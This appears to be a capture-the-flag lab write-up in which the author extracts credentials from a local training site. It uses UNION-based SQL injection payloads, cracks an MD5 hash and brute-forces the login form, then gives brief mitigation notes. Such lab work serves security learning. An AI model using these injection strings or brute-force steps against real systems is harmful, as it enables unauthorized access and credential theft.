We find the following by exploring the database to see if we can find any account password we can use to sign in:  

```
ID: 1 OR 1=1 UNION SELECT table_name, table_schema FROM information_schema.columns; 
First name: db_default
Surname : Member_Brute_Force
```  
-> There is a Member_Brute_Force schema (database) inside the table db_default

<!-- TABLE_SCHEMA: The name of the schema (database) to which the table belongs. -->

```
ID: 1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns; 
First name: db_default
Surname : username

ID: 1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns; 
First name: db_default
Surname : password
```  

Let's see what is inside the username and password fields that are in the table

```
ID: 1 OR 1=1 UNION SELECT username, password FROM Member_Brute_Force.db_default; 
First name: root
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8

ID: 1 OR 1=1 UNION SELECT username, password FROM Member_Brute_Force.db_default; 
First name: admin
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
```

When trying to sign in with this password, it is not working. 
Let's try to decrypt the password. Using dcode.fr, we see that the password is encoded in MD5.
-> The password is `shadow`.

We get the flag with admin / shadow.

-> To prevent this, use a harder encryption algorithm for the passwords, and encrypt also the usernames.

Let's also try to bruteforce the password using a dictionary with the 100 most used passwords.
<!-- https://en.wikipedia.org/wiki/Wikipedia:10,000_most_common_passwords -->

URL syntax: http://192.168.56.103/index.php?page=signin&username=admin&password=hello&Login=Login#  

By running the script, and waiting a bit, we get the following:  
```
./script.sh 

% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2088    0  2088    0     0  1057k      0 --:--:-- --:--:-- --:--:-- 2039k
<center><h2 style="margin-top:50px;">The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 </h2><br/><img src="images/win.png" alt="" width=200px height=200px></center>                               </div>

```

So, Brute-forcing is also working. To prevent this, we might want to restrict the number of tries to sign in into an account, and change the URL, so that it doesn't have a username and password parameter in it.
